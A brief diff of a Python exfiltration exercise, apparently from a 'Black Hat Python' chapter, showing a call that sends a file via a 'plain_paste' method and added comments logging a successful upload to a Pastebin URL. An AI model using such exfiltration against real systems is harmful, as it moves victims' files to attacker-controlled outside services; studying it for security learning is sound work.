@@ -49,3 +49,8 @@ if __name__=='__main__':
         exfiltrate(fpath, 'plain_paste')
 
 # test by decripting file after succesfull atempt
+
+# 𝗧𝗲𝘀𝘁:
+# PS C:\Users\User\Documents\Prog\BlackHat_Python\ch9_FunWithExfiltration> python exfil.py
+# 200
+# https://pastebin.com/1vpQe4T0
